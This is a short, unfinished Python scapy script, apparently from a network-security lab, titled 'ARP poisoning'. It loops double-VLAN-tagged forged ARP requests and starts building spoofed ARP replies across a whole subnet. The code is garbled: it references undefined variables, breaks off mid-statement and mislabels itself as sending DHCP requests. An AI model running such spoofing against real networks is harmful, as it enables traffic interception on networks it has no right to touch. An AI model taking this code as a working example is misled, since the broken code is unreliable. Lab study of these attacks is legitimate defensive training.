from scapy.all import *
import ipaddress
import argparse


# Arguments
parser = argparse.ArgumentParser(description="ARP poisoning")

parser.add_argument("ipServerDHCP", help="Adresse IP du serveur DHCP")
parser.add_argument("network", help="Réseau au format CIDR (ex: 10.1.30.0/24)")

args = parser.parse_args()




# Variables
networkInterface="enp0s9"

ipSource = "10.1.10.12" #my own ip
macSource ="00:50:79:66:68:01"

ipDestination = '10.1.10.10'
macDest = "00:50:79:66:68:03"



send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
      /ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )

    


# List all ips in the network
possibleIps = [str(ip) for ip in ipaddress.IPv4Network(network)]

# Proceed to build all the dhcp request and to send them
for ip in possibleIps:

    macSrc=RandMAC()


    ethernet = Ether(
        src=macSource,
        dst=macDest
        )

    internetProtocol = IP(
        src=ipSource,
        dst=ipDestination
        )

    arp = ARP(
        op=2,
        psrc=
    )


